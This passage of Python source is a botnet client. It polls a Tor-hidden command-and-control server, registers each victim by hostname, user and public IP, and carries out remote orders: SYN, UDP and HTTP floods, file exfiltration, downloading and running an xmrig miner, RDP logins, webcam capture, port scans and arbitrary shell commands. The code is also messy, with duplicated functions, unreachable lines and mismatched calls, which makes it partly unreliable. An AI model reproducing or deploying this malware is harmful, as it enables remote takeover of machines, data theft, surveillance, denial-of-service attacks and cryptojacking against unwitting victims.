                            try:
                                pinfo = proc.info
                                logger.info(f"PID: {pinfo['pid']}, Name: {pinfo['name']}, CPU: {pinfo['cpu_percent']}%, Memory: {pinfo['memory_percent']}%")
                            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                                pass

                    return f"Resource hijack for {process_name} finished."
                except Exception as e:
                    logger.error(f"Error hijacking resources: {e}")
                    return None

            def scanNetwork(subnet, ports):
                logger.info(f"Scanning network {subnet} on ports {ports}.")
                try:
                    open_ports = []
                    closed_ports = []
                    filtered_ports = []

                    for port in ports:
                        packet = IP(dst=subnet)/TCP(dport=port, flags="S")
                        response = sr(packet, timeout=1, verbose=0)
                        if response:
                            for sent, received in response:
                                if received.haslayer(TCP) and received.getlayer(TCP).flags == 0x12:
                                    open_ports.append(port)
                                elif received.haslayer(TCP) and received.getlayer(TCP).flags == 0x14:
                                    closed_ports.append(port)
                                elif received.haslayer(TCP) and received.getlayer(TCP).flags == 0x18:
                                    filtered_ports.append(port)
                        else:
                            filtered_ports.append(port)

                    logger.info(f"Open ports found: {open_ports}")
                    logger.info(f"Closed ports found: {closed_ports}")
                    logger.info(f"Filtered ports found: {filtered_ports}")

                    report = {
                        'subnet': subnet,
                        'open_ports': open_ports,
                        'closed_ports': closed_ports,
                        'filtered_ports': filtered_ports
                    }
                    return report
                except Exception as e:
                    logger.error(f"Error scanning network: {e}")
                    return None


            def webcamControl(command):
                logger.info(f"Executing webcam command: {command}")
                try:
                    cap = cv2.VideoCapture(0)  # 0 is the default camera index

                    if not cap.isOpened():
                        logger.error("Error: Could not open webcam.")
                        return "Error: Could not open webcam."

                    if command == 'start':
                        # Start the webcam and display the feed
                        while True:
                            ret, frame = cap.read()
                            if not ret:
                                logger.error("Error: Could not read frame from webcam.")
                                break
                            cv2.imshow('Webcam Feed', frame)
                            if cv2.waitKey(1) & 0xFF == ord('q'):
                                break
                        cap.release()
                        cv2.destroyAllWindows()
                        logger.info("Webcam started and feed displayed.")
                        return "Webcam started and feed displayed."

                    elif command == 'stop':
                        # Stop the webcam feed
                        cap.release()
                        cv2.destroyAllWindows()
                        logger.info("Webcam stopped.")
                        return "Webcam stopped."

                    elif command == 'capture':
                        # Capture an image from the webcam
                        ret, frame = cap.read()
                        if not ret:
                            logger.error("Error: Could not read frame from webcam.")
                            return "Error: Could not read frame from webcam."
                        cv2.imwrite('captured_image.jpg', frame)
                        logger.info("Image captured from webcam and saved as 'captured_image.jpg'.")
                        cap.release()
                        return "Image captured from webcam and saved as 'captured_image.jpg'."

                    else:
                        logger.error(f"Unknown command: {command}")
                        return f"Unknown command: {command}"

                except Exception as e:
                    logger.error(f"Error controlling webcam: {e}")
                    return None




            # --- Command Handling ---
            def handle_command(command_obj):
                try:
                    command_type = command_obj.get('type', '')
                    logger.debug(f"Received command object: {command_obj}")
                    if command_type == 'command':
                        handle_simple_command(command_obj)
                    elif command_type == 'function':
                        handle_function_command(command_obj)
                    else:
                        logger.error(f"Unknown command type received: '{command_type}'")
                except Exception:
                    logger.exception("An error occurred in the main command handler.")

            def handle_function_command(command_obj):
                function_name = command_obj.get('function', '')
                params = command_obj.get('params', {})
                command_id = command_obj.get('command_id')
                logger.info(f"Executing function '{function_name}' with params: {params}")
                output = {'status': 'error', 'output': f"Unknown or unsupported function '{function_name}'"}

                try:
                    if function_name == 'ddos':
                        target = params.get('target', '127.0.0.1')
                        port = params.get('port', 80)
                        method = params.get('method', 'syn-flood')
                        duration = params.get('duration', 60)
                        pps = params.get('pps', 100)  # Default to 100 packets per second
                        thread = threading.Thread(target=ddos, args=(target, port, method, duration, pps), name=f"DDoS-{target}")
                        thread.daemon = True
                        thread.start()
                        output = {'status': 'ok', 'output': f'DDoS attack started on {target}:{port} with method {method} for {duration} seconds at {pps} pps'}
                    elif function_name == 'dataExfiltration':
                        file_path = params.get('file_path')
                        method = params.get('method', 'direct')
                        search_pattern = params.get('search_pattern')
                        data = dataExfiltration(file_path, method, search_pattern)
                        output = {'status': 'ok', 'output': data}
                    elif function_name == 'geolocation':
                        ip_address = params.get('ip_address')
                        location_data = geolocation(ip_address)
                        output = {'status': 'ok', 'output': location_data}
                    elif function_name == 'miner':
                        start = params.get('start')
                        stop = params.get('stop')
                        miner_result = miner(start, stop)
                        output = {'status': 'ok', 'output': miner_result}
                    elif function_name == 'rdp':
                        target = params.get('target')
                        username = params.get('username')
                        password = params.get('password')
                        rdp_result = rdp(target, username, password)
                        output = {'status': 'ok', 'output': rdp_result}
                    elif function_name == 'resourceHijack':
                        process_name = params.get('process_name')
                        cpu_usage = params.get('cpu_usage')
                        duration = params.get('duration')
                        resource_result = resourceHijack(process_name, cpu_usage, duration)
                        output = {'status': 'ok', 'output': resource_result}
                    elif function_name == 'scanNetwork':
                        subnet = params.get('subnet')
                        ports = params.get('ports')
                        if not subnet or not ports:
                            output = {'status': 'error', 'output': 'Subnet and ports are required parameters.'}
                        else:
                            scan_result = scanNetwork(subnet, ports)
                            output = {'status': 'ok', 'output': scan_result}
                    elif function_name == 'webcamControl':
                        command = params.get('command')
                        webcam_result = webcamControl(command)
                        output = {'status': 'ok', 'output': webcam_result}
                    else:
                        logger.warning(f"No handler for function '{function_name}'.")
                        output = {'status': 'error', 'output': f"Unknown or unsupported function '{function_name}'"}
                except Exception as e:
                    logger.exception(f"Error executing function '{function_name}'.")
                    output = {'status': 'error', 'output': str(e)}

                logger.info(f"Function '{function_name}' executed.")
                logger.debug(f"Sending response for command ID {command_id}")
                send_response(command_id, output)



            def handle_simple_command(command_obj):
                command = command_obj.get('command', '')
                command_id = command_obj.get('command_id')
                logger.info(f"Executing simple command: '{command}'")
                output = {'status': 'error', 'output': 'Unknown command'}

                try:
                    if command == 'ping':
                        output = {'status': 'ok', 'output': 'pong'}
                    elif command == 'sleep':
                        logger.info("Received 'sleep' command. No response needed.")
                        return
                    elif command == 'register':
                        logger.info("C2 requested re-registration.")
                        register_with_c2()
                        return
                    elif command.startswith('execute '):
                        cmd = command.split(' ', 1)[1]
                        logger.debug(f"Executing shell command: {cmd}")
                        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=300)
                        command_output = result.stdout or result.stderr
                        output = {'status': 'ok', 'output': command_output}
                        logger.debug(f"Shell command executed. Output length: {len(command_output)}")
                    else:
                        logger.warning(f"Unknown simple command '{command}'.")

                except subprocess.TimeoutExpired:
                    logger.error(f"Shell command '{cmd}' timed out.")
                    output = {'status': 'error', 'output': 'Command timed out after 300 seconds.'}
                except Exception as e:
                    logger.exception(f"Error executing simple command: {command}")
                    output = {'status': 'error', 'output': str(e)}

                logger.debug(f"Sending response for command ID {command_id}")
                send_response(command_id, output)

            def send_response(command_id, output):
                logger.info(f"Sending response for command ID {command_id}.")
                try:
                    response_payload = {'command_id': command_id, 'output': output}
                    logger.debug(f"Response payload (pre-encryption): {json.dumps(response_payload)}")
                    encrypted_response = encrypt_data(json.dumps(response_payload))
                    endpoint = build_c2_url(f'/api/bot/response/{BOT_ID}')
                    response = requests.post(endpoint, data=encrypted_response, proxies=proxies, timeout=120)
                    response.raise_for_status()
                    try:
                        response_data = response.json()
                    except (json.JSONDecodeError, ValueError):
                        response_data = {}
                    update_control_url(response_data.get('control_url'))
                    logger.info(f"Successfully sent response for command ID {command_id}")
                except requests.exceptions.RequestException:
                    logger.exception(f"Failed to send command response for command ID {command_id} due to network error.")
                except Exception:
                    logger.exception(f"An unexpected error occurred while sending response for command ID {command_id}.")


                while True:
                    try:
                        with open('reg.csv', 'r') as f:
                            reader = csv.reader(f)
                            next(reader) # skip header
                            reg_data = next(reader)
                            system_id = reg_data[0]

                        ping_payload = {'id': BOT_ID}
                        encrypted_payload = encrypt_data(json.dumps(ping_payload))
                        ping_url = build_c2_url('/api/bot/ping')
                        response = requests.post(ping_url, data=encrypted_payload, proxies=proxies, timeout=60)
                        try:
                            response_data = response.json()
                        except (json.JSONDecodeError, ValueError):
                            response_data = {}
                        update_control_url(response_data.get('control_url'))
                        logger.info("Sent ping to C2.")
                    except FileNotFoundError:
                        logger.warning("reg.csv not found. Bot not registered yet? Will retry ping later.")
                    except Exception as e:
                        logger.exception("An error occurred while sending ping to C2.")
                    time.sleep(10) # Ping every 10 seconds



        # Main loop
        while True:
            c2_log_handler = C2LogHandler(BOT_ID, proxies)
            c2_log_handler.setLevel(logging.INFO)
            formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
            c2_log_handler.setFormatter(formatter)
            logging.getLogger().addHandler(c2_log_handler)

            logger.info("Bot main function started.")
            if not check_tor_connectivity():
                logger.critical("Tor is not available... Awaiting C2 Startup...")
                time.sleep(5)
                main()

            # Start network stats thread
            net_stats_thread = threading.Thread(target=send_network_stats, daemon=True)
            net_stats_thread.start()

            # Start ping thread
            ping_thread = threading.Thread(target=ping_c2, daemon=True)
            ping_thread.start()
            logger.info("Polling C2 for commands (long poll)...")
            poll_url = build_c2_url(f'/api/bot/poll/{BOT_ID}')
            response = requests.get(poll_url, proxies=proxies, timeout=120)
            logger.debug(f"Poll response received. Status: {response.status_code}")

            if response.status_code == 200 and response.headers.get('Content-Type', '').startswith('application/json'):
                try:
                    payload = response.json()
                except (json.JSONDecodeError, ValueError):
                    logger.warning("Failed to parse JSON while polling C2.")
                    time.sleep(5)
                    continue

                update_control_url(payload.get('control_url'))

                if payload.get('status') == 'ok' and payload.get('output') == 'no commands':
                    logger.debug("No commands available from C2.")
                    time.sleep(5)
                    continue

                logger.warning(f"Unexpected JSON payload from C2: {payload}")
                time.sleep(5)
                continue

            if response.status_code == 200:
                logger.info("Encrypted command received from C2.")
                command_obj_str = decrypt_data(response.text)
                logger.debug(f"Decrypted command payload: {command_obj_str}")
                command_obj = json.loads(command_obj_str)

                with open(args.output, 'a') as f:
                    f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] Received command: {command_obj_str}\n")

                handle_command(command_obj)
            else:
                logger.warning(f"C2 returned non-200 status code: {response.status_code}. Response: {response.text[:200]}")
                time.sleep(10)






















            print("[*] Running main loop...")
            # You can add sleep to prevent busy loop
            time.sleep(5)


            # --- Detailed Logging Configuration ---
            logging.basicConfig(
                level=logging.DEBUG,
                format='%(asctime)s - %(name)s - %(levelname)s - %(threadName)s - %(message)s',
                datefmt='%Y-%m-%d %H:%M:%S'
            )
            logger = logging.getLogger('Bot')

            logger.info("Bot script started.")
            csv_path = "reg.csv"
            header = ["BOT_ID"]


            # --- Argument Parser ---
            parser = argparse.ArgumentParser(description='A bot that connects to a C2 server.')
            parser.add_argument('--output', default='output.txt', help='The name of the output file.')
            args = parser.parse_args()
            logger.debug(f"Arguments parsed: {args}")

            # --- Configuration ---
            def get_c2_address():
                logger.info("Attempting to determine C2 address...")
                address = get_current_control_url()
                if address:
                    logger.info(f"Using C2 address: {address}")
                    return address

                logger.warning("No control URL provided; falling back to default.")
                return DEFAULT_CONTROL_URL

            C2_SERVER = get_c2_address()
            BOT_ID = f"{platform.node()}-{os.getpid()}"
            ENCRYPTION_KEY = b'sixteen byte key'
            MODULES_DIR = 'MODULES'
            logger.debug(f"Bot ID set to: {BOT_ID}")
            # Check if file exists
            file_exists = os.path.exists(csv_path)

            with open(csv_path, 'a', newline='') as f:  # append mode
                writer = csv.writer(f)
                if not file_exists:
                    writer.writerow(header)  # write header only if file is new
                writer.writerow([BOT_ID])  # write the BOT_ID
            logger.debug("ID Saved to reg.csv")
            logger.debug("Core configuration variables set.")

            # --- Tor Proxy Configuration ---
            proxies = {
                'http': 'socks5h://127.0.0.1:9050',
                'https': 'socks5h://127.0.0.1:9050'
            }
            logger.debug(f"Tor proxy configured: {proxies}")









            # --- Encryption Functions ---
            def encrypt_data(data):
                logger.debug(f"Encrypting data of length {len(data)} bytes.")
                try:
                    cipher = AES.new(ENCRYPTION_KEY, AES.MODE_CBC)
                    ct_bytes = cipher.encrypt(pad(data.encode(), AES.block_size))
                    iv = base64.b64encode(cipher.iv).decode('utf-8')
                    ct = base64.b64encode(ct_bytes).decode('utf-8')
                    encrypted_string = iv + ct
                    logger.debug(f"Encryption successful. Result length: {len(encrypted_string)}")
                    return encrypted_string
                except Exception:
                    logger.exception("An unexpected error occurred during data encryption.")
                    raise

            def decrypt_data(encrypted_data):
                logger.debug(f"Decrypting data of length {len(encrypted_data)} bytes.")
                try:
                    iv = base64.b64decode(encrypted_data[:24])
                    ct = base64.b64decode(encrypted_data[24:])
                    cipher = AES.new(ENCRYPTION_KEY, AES.MODE_CBC, iv)
                    pt = unpad(cipher.decrypt(ct), AES.block_size)
                    decrypted_string = pt.decode()
                    logger.debug(f"Decryption successful. Result length: {len(decrypted_string)}")
                    return decrypted_string
                except Exception:
                    logger.exception("An unexpected error occurred during data decryption.")
                    raise

            UA = "Mozilla/5.0"

            PROVIDERS_V4 = [
                "https://api.ipify.org",
                "https://checkip.amazonaws.com",
                "https://ipv4.icanhazip.com",
                "https://ifconfig.me/ip",
                "https://ident.me",
            ]

            PROVIDERS_V6 = [
                "https://api6.ipify.org",
                "https://ipv6.icanhazip.com",
            ]

            def _fetch(url: str, timeout: float) -> str | None:
                req = urllib.request.Request(url, headers={"User-Agent": UA})
                with urllib.request.urlopen(req, timeout=timeout) as r:
                    raw = r.read().decode().strip()
                try:
                    ip = ipaddress.ip_address(raw)
                    return str(ip)
                except ValueError:
                    return None

            def public_ip(prefer_ipv6: bool = False, timeout: float = 4.0) -> str:
                providers = (PROVIDERS_V6 + PROVIDERS_V4) if prefer_ipv6 else (PROVIDERS_V4 + PROVIDERS_V6)
                providers = providers[:]  # copy
                random.shuffle(providers)

                last_err = None
                for url in providers:
                    try:
                        # We don't use the proxy here to get the REAL public IP
                        ip = _fetch(url, timeout)
                        if ip:
                            if prefer_ipv6 and ":" in ip:
                                return ip
                            if not prefer_ipv6 and ":" not in ip:
                                return ip
                            # if preference not met, still accept a valid IP after trying a few
                            fallback = _fetch(url, timeout)
                            if fallback:
                                return fallback
                    except Exception as e:
                        last_err = e
                        continue
                raise RuntimeError(f"could not determine public IP; last error: {last_err}")




            # Assuming encrypt_data and public_ip are defined elsewhere in your code
            # from your_module import encrypt_data, public_ip

            logger = logging.getLogger(__name__)

            def generate_bot_id():
                """Generate a bot ID using the hostname as prefix and current process PID as suffix."""
                hostname = platform.node().upper()  # Standardize hostname to uppercase
                pid = os.getpid()  # Get current process ID
                return f"{hostname}-{pid}"

            def register_with_c2():
                proxies = {'http': 'socks5h://127.0.0.1:9050', 'https': 'socks5h://127.0.0.1:9050'}

                # Attempt to read existing registration
                if os.path.exists('reg.csv'):
                    try:
                        with open('reg.csv', 'r') as f:
                            reader = csv.reader(f)
                            header = next(reader, None)  # skip header safely
                            row = next(reader, None)  # get first data row
                            if row and row[0]:
                                bot_id = row[0]

                                BOT_ID = bot_id
                                logger.warning(f"Existing BOT_ID found: {BOT_ID}")

                                # Send ping to C2
                                ping_payload = {'id': BOT_ID}
                                encrypted_payload = encrypt_data(json.dumps(ping_payload))
                                ping_url = build_c2_url(f'/api/bots/{BOT_ID}/ping')
                                logger.warning(f"Sending Ping To: {ping_url}")
                                response = requests.get(ping_url, data=encrypted_payload, proxies=proxies, timeout=60)

                                # Check for pong
                                try:
                                    logger.debug(f"Ping response status code: {response.status_code}")
                                    logger.debug(f"Ping response text: {response.text}")
                                    if response.status_code == 200:
                                        output = response.json()
                                        update_control_url(output.get('control_url'))
                                        logger.debug(f"Ping Output text: {output}")
                                        if output.get('status') == 'green' or output.get('output') == 'pong':
                                            logger.info(f"{BOT_ID} received pong from C2")
                                            return BOT_ID
                                            bot_id = BOT_ID
                                            return bot_id
                                        else:
                                            logger.warning(f"Unexpected ping response: {output}")
                                    elif response.status_code == 405:
                                        logger.warning(f"Ping request returned 405 Method Not Allowed. Response: {response.text}")
                                    else:
                                        logger.warning(f"Ping request returned an unexpected status code: {response.status_code}")
                                except json.JSONDecodeError:
                                    logger.warning("Failed to parse ping response as JSON.")
                                except Exception as e:
                                    logger.warning(f"An error occurred while parsing the ping response: {e}")

                    except Exception as e:
                        logger.warning(f"Failed to read existing BOT_ID. Will attempt fresh registration. Error: {e}")

                N_BOT_ID = generate_bot_id()
                logger.debug(f"Bot ID set to: {N_BOT_ID}")
                logger.debug("Core configuration variables set.")

                # Attempt full registration
                logger.info(f"Attempting to register bot with ID: {N_BOT_ID}")
                try:
                    info = {
                        'os': platform.system(),
                        'hostname': platform.node(),
                        'user': getpass.getuser(),
                        'ip': public_ip()
                    }
                    payload = {'id': N_BOT_ID, 'info': info}
                    logger.debug(f"Registration payload (pre-encryption): {json.dumps(payload)}")

                    encrypted_payload = encrypt_data(json.dumps(payload))
                    registration_url = build_c2_url('/api/bot/register')

                    logger.debug(f"Sending registration request to: {registration_url}")
                    response = requests.post(registration_url, data=encrypted_payload, proxies=proxies, timeout=120)
                    response.raise_for_status()
                    try:
                        response_data = response.json()
                    except (json.JSONDecodeError, ValueError):
                        response_data = {}
                    update_control_url(response_data.get('control_url'))

                    logger.info("Successfully registered with C2 server.")

                    # Write the registered BOT_ID to reg.csv
                    with open('reg.csv', 'w', newline='') as f:
                        writer = csv.writer(f)
                        writer.writerow(['BOT_ID'])
                        writer.writerow([N_BOT_ID])

                except requests.exceptions.RequestException as e:
                    logger.exception(f"Failed to register with C2 due to a network error. Will retry later. Error: {e}")
                    time.sleep(10)
                except Exception as e:
                    logger.exception(f"An unexpected error occurred during registration. Error: {e}")
                    time.sleep(10)

                return N_BOT_ID
                bot_id = N_BOT_ID
                return bot_id


    # Handle other commands as needed
            # --- Bot Function Definitions ---
            def ddos(target, port, method, duration, pps):
                if method == 'syn-flood':
                    syn_flood(target, port, duration, pps)
                elif method == 'udp-flood':
                    udp_flood(target, port, duration, pps)
                elif method == 'http-flood':
                    http_flood(target, port, duration, pps)
                else:
                    logger.error(f"Unknown DDoS method: {method}")

            def syn_flood(target, port, duration, pps):
                start_time = time.time()
                while time.time() - start_time < duration:
                    try:
                        for _ in range(pps):
                            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            sock.connect((target, port))
                            sock.sendall(b'GET / HTTP/1.1\r\nHost: ' + target.encode() + b'\r\n\r\n')
                            sock.close()
                        time.sleep(1)
                    except Exception as e:
                        logger.error(f"Error in SYN flood: {e}")

            def udp_flood(target, port, duration, pps):
                start_time = time.time()
                while time.time() - start_time < duration:
                    try:
                        for _ in range(pps):
                            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                            sock.sendto(b' ' * 1024, (target, port))
                        time.sleep(1)
                    except Exception as e:
                        logger.error(f"Error in UDP flood: {e}")

            def http_flood(target, port, duration, pps):
                start_time = time.time()
                while time.time() - start_time < duration:
                    try:
                        for _ in range(pps):
                            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            sock.connect((target, port))
                            sock.sendall(b'GET / HTTP/1.1\r\nHost: ' + target.encode() + b'\r\n\r\n')
                            sock.close()
                        time.sleep(1)
                    except Exception as e:
                        logger.error(f"Error in HTTP flood: {e}")

            def dataExfiltration(file_path, method, search_pattern):
                logger.info(f"Exfiltrating data from {file_path} using {method}.")
                try:
                    with open(file_path, 'r') as file:
                        content = file.read()
                        if search_pattern:
                            matches = [line for line in content.split('\n') if search_pattern in line]
                            return matches
                        else:
                            return content
                except Exception as e:
                    logger.error(f"Error exfiltrating data: {e}")
                    return None

            def geolocation(ip_address):
                logger.info(f"Getting geolocation for IP: {ip_address}")
                try:
                    response = requests.get(f'https://ipinfo.io/{ip_address}/json')
                    response.raise_for_status()
                    data = response.json()
                    return data
                except requests.exceptions.RequestException as e:
                    logger.error(f"Error getting geolocation: {e}")
                    return None



            # Configure logging
            logging.basicConfig(level=logging.INFO)
            logger = logging.getLogger(__name__)

            MINER_BINARIES = {
                'windows': {
                    'btc': 'https://download.ccextract.com/bitcoin-core-25.0-win64.zip',
                    'xmr': 'https://download.xmrig.com/v6.24.0/xmrig-6.24.0-win64.zip'
                },
                'linux': {
                    'btc': 'https://download.ccextract.com/bitcoin-core-25.0-x86_64-linux-gnu.tar.gz',
                    'xmr': 'https://download.xmrig.com/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz'
                },
                'darwin': {
                    'btc': 'https://download.ccextract.com/bitcoin-core-25.0-osx64.tar.gz',
                    'xmr': 'https://download.xmrig.com/v6.24.0/xmrig-6.24.0-macos-static-x64.tar.gz'
                }
            }

            def miner(start, stop, recipient_address, resource_use_cap, pool, proxies, token_name):
                logger.info(f"Starting miner for {token_name}.")
                try:
                    os_name = platform.system().lower()
                    if os_name not in MINER_BINARIES:
                        logger.error(f"Unsupported OS: {os_name}")
                        return f"Unsupported OS: {os_name}"

                    miner_url = MINER_BINARIES[os_name][token_name.lower()]
                    miner_exe = download_and_extract_miner(miner_url, token_name)

                    if stop:
                        logger.info(f"Stopping {token_name} miner.")
                        stop_miner(miner_exe, token_name)
                    else:
                        start_miner(miner_exe, recipient_address, resource_use_cap, pool, proxies, token_name)
                        logger.info(f"{token_name} miner started.")
                    return f"{token_name} miner operations finished."
                except Exception as e:
                    logger.error(f"Error in miner: {e}")
                    return None

            def download_and_extract_miner(url, token_name):
                response = requests.get(url)
                response.raise_for_status()
                extract_path = f'./miners/{token_name}'
                os.makedirs(extract_path, exist_ok=True)

                if token_name.lower() == 'btc':
                    with zipfile.ZipFile(io.BytesIO(response.content)) as z:
                        z.extractall(path=extract_path)
                    miner_exe = f'{extract_path}/bitcoin-qt'
                elif token_name.lower() == 'xmr':
                    with tarfile.open(fileobj=io.BytesIO(response.content), mode="r:gz") as tar:
                        tar.extractall(path=extract_path)
                    miner_exe = f'{extract_path}/xmrig'
                else:
                    logger.error(f"Unknown token: {token_name}")
                    return None

                os.chmod(miner_exe, 0o755)  # Make the executable readable and executable
                return miner_exe

            def start_miner(miner_exe, recipient_address, resource_use_cap, pool, proxies, token_name):
                command = [
                    miner_exe,
                    '--url', pool,
                    '--user', recipient_address,
                    '--pass', 'x',
                    '--proxy', proxies,
                    '--max-cpu-usage', str(resource_use_cap)
                ]
                process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                logger.info(f"Started {token_name} miner with PID {process.pid}.")

            def stop_miner(miner_exe, token_name):
                command = ['pkill', '-f', miner_exe]
                process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                logger.info(f"Stopped {token_name} miner with command {command}.")

            def rdp(target, username, password):
                logger.info(f"Attempting RDP to {target} with username {username}.")
                try:
                    command = f'xfreerdp /v:{target} /u:{username} /p:{password} /cert:tofu'
                    subprocess.run(command, shell=True, check=True)
                    return f"RDP connection to {target} successful."
                except subprocess.CalledProcessError as e:
                    logger.error(f"RDP connection failed: {e}")
                    return None




            # Configure logging
            logging.basicConfig(level=logging.INFO)
            logger = logging.getLogger(__name__)

            def resourceHijack(process_name, cpu_usage, duration, display_all_procs=False):
                logger.info(f"Hijacking resources for process {process_name}.")
                try:
                    start_time = time.time()
                    while time.time() - start_time < duration:
                        # Simulate CPU usage
                        for _ in range(cpu_usage):
                            _ = [i * i for i in range(1000000)]
                        time.sleep(1)

                    if display_all_procs:
                        logger.info("Displaying all running processes:")
                        for proc in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_percent']):
                            try:
                                pinfo = proc.info
                                logger.info(f"PID: {pinfo['pid']}, Name: {pinfo['name']}, CPU: {pinfo['cpu_percent']}%, Memory: {pinfo['memory_percent']}%")
                            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                                pass

                    return f"Resource hijack for {process_name} finished."
                except Exception as e:
                    logger.error(f"Error hijacking resources: {e}")
                    return None

            def scanNetwork(subnet, ports):
                logger.info(f"Scanning network {subnet} on ports {ports}.")
                try:
                    open_ports = []
                    closed_ports = []
                    filtered_ports = []

                    for port in ports:
                        packet = IP(dst=subnet)/TCP(dport=port, flags="S")
                        response = sr(packet, timeout=1, verbose=0)
                        if response:
                            for sent, received in response:
                                if received.haslayer(TCP) and received.getlayer(TCP).flags == 0x12:
                                    open_ports.append(port)
                                elif received.haslayer(TCP) and received.getlayer(TCP).flags == 0x14:
                                    closed_ports.append(port)
                                elif received.haslayer(TCP) and received.getlayer(TCP).flags == 0x18:
                                    filtered_ports.append(port)
                        else:
                            filtered_ports.append(port)

                    logger.info(f"Open ports found: {open_ports}")
                    logger.info(f"Closed ports found: {closed_ports}")
                    logger.info(f"Filtered ports found: {filtered_ports}")

                    report = {
                        'subnet': subnet,
                        'open_ports': open_ports,
                        'closed_ports': closed_ports,
                        'filtered_ports': filtered_ports
                    }
                    return report
                except Exception as e:
                    logger.error(f"Error scanning network: {e}")
                    return None


            def webcamControl(command):
                logger.info(f"Executing webcam command: {command}")
                try:
                    cap = cv2.VideoCapture(0)  # 0 is the default camera index

                    if not cap.isOpened():
                        logger.error("Error: Could not open webcam.")
                        return "Error: Could not open webcam."

                    if command == 'start':
                        # Start the webcam and display the feed
                        while True:
                            ret, frame = cap.read()
                            if not ret:
                                logger.error("Error: Could not read frame from webcam.")
                                break
                            cv2.imshow('Webcam Feed', frame)
                            if cv2.waitKey(1) & 0xFF == ord('q'):
                                break
                        cap.release()
                        cv2.destroyAllWindows()
                        logger.info("Webcam started and feed displayed.")
                        return "Webcam started and feed displayed."

                    elif command == 'stop':
                        # Stop the webcam feed
                        cap.release()
                        cv2.destroyAllWindows()
                        logger.info("Webcam stopped.")
                        return "Webcam stopped."

                    elif command == 'capture':
                        # Capture an image from the webcam
                        ret, frame = cap.read()
                        if not ret:
                            logger.error("Error: Could not read frame from webcam.")
                            return "Error: Could not read frame from webcam."
                        cv2.imwrite('captured_image.jpg', frame)
                        logger.info("Image captured from webcam and saved as 'captured_image.jpg'.")
                        cap.release()
                        return "Image captured from webcam and saved as 'captured_image.jpg'."

                    else:
                        logger.error(f"Unknown command: {command}")
                        return f"Unknown command: {command}"

                except Exception as e:
                    logger.error(f"Error controlling webcam: {e}")
                    return None

            # --- Command Handling ---
            def handle_command(command_obj):
                try:
                    command_type = command_obj.get('type', '')
                    logger.debug(f"Received command object: {command_obj}")
                    if command_type == 'command':
                        handle_simple_command(command_obj)
                    elif command_type == 'function':
                        handle_function_command(command_obj)
                    else:
                        logger.error(f"Unknown command type received: '{command_type}'")
                except Exception:
                    logger.exception("An error occurred in the main command handler.")

            def handle_function_command(command_obj):
                function_name = command_obj.get('function', '')
                params = command_obj.get('params', {})
                command_id = command_obj.get('command_id')
                logger.info(f"Executing function '{function_name}' with params: {params}")
                output = {'status': 'error', 'output': f"Unknown or unsupported function '{function_name}'"}

                try:
                    if function_name == 'ddos':
                        target = params.get('target', '127.0.0.1')
                        port = params.get('port', 80)
                        method = params.get('method', 'syn-flood')
                        duration = params.get('duration', 60)
                        pps = params.get('pps', 100)  # Default to 100 packets per second
                        thread = threading.Thread(target=ddos, args=(target, port, method, duration, pps), name=f"DDoS-{target}")
                        thread.daemon = True
                        thread.start()
                        output = {'status': 'ok', 'output': f'DDoS attack started on {target}:{port} with method {method} for {duration} seconds at {pps} pps'}
                    elif function_name == 'dataExfiltration':
                        file_path = params.get('file_path')
                        method = params.get('method', 'direct')
                        search_pattern = params.get('search_pattern')
                        data = dataExfiltration(file_path, method, search_pattern)
                        output = {'status': 'ok', 'output': data}
                    elif function_name == 'geolocation':
                        ip_address = params.get('ip_address')
                        location_data = geolocation(ip_address)
                        output = {'status': 'ok', 'output': location_data}
                    elif function_name == 'miner':
                        start = params.get('start')
                        stop = params.get('stop')
                        miner_result = miner(start, stop)
                        output = {'status': 'ok', 'output': miner_result}
                    elif function_name == 'rdp':
                        target = params.get('target')
                        username = params.get('username')
                        password = params.get('password')
                        rdp_result = rdp(target, username, password)
                        output = {'status': 'ok', 'output': rdp_result}
                    elif function_name == 'resourceHijack':
                        process_name = params.get('process_name')
                        cpu_usage = params.get('cpu_usage')
                        duration = params.get('duration')
                        resource_result = resourceHijack(process_name, cpu_usage, duration)
                        output = {'status': 'ok', 'output': resource_result}
                    elif function_name == 'scanNetwork':
                        subnet = params.get('subnet')
                        ports = params.get('ports')
                        if not subnet or not ports:
                            output = {'status': 'error', 'output': 'Subnet and ports are required parameters.'}
                        else:
                            scan_result = scanNetwork(subnet, ports)
                            output = {'status': 'ok', 'output': scan_result}
                    elif function_name == 'webcamControl':
                        command = params.get('command')
                        webcam_result = webcamControl(command)
                        output = {'status': 'ok', 'output': webcam_result}
                    else:
                        logger.warning(f"No handler for function '{function_name}'.")
                        output = {'status': 'error', 'output': f"Unknown or unsupported function '{function_name}'"}
                except Exception as e:
                    logger.exception(f"Error executing function '{function_name}'.")
                    output = {'status': 'error', 'output': str(e)}

                logger.info(f"Function '{function_name}' executed.")
                logger.debug(f"Sending response for command ID {command_id}")
                send_response(command_id, output)

            def handle_simple_command(command_obj):
                command = command_obj.get('command', '')
                command_id = command_obj.get('command_id')
                logger.info(f"Executing simple command: '{command}'")
                output = {'status': 'error', 'output': 'Unknown command'}

                try:
                    if command == 'ping':
                        output = {'status': 'ok', 'output': 'pong'}
                    elif command == 'sleep':
                        logger.info("Received 'sleep' command. No response needed.")
                        return
                    elif command == 'register':
                        logger.info("C2 requested re-registration.")
                        register_with_c2()
                        return
                    elif command.startswith('execute '):
                        cmd = command.split(' ', 1)[1]
                        logger.debug(f"Executing shell command: {cmd}")
                        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=300)
                        command_output = result.stdout or result.stderr
                        output = {'status': 'ok', 'output': command_output}
                        logger.debug(f"Shell command executed. Output length: {len(command_output)}")
                    else:
                        logger.warning(f"Unknown simple command '{command}'.")

                except subprocess.TimeoutExpired:
                    logger.error(f"Shell command '{cmd}' timed out.")
                    output = {'status': 'error', 'output': 'Command timed out after 300 seconds.'}
                except Exception as e:
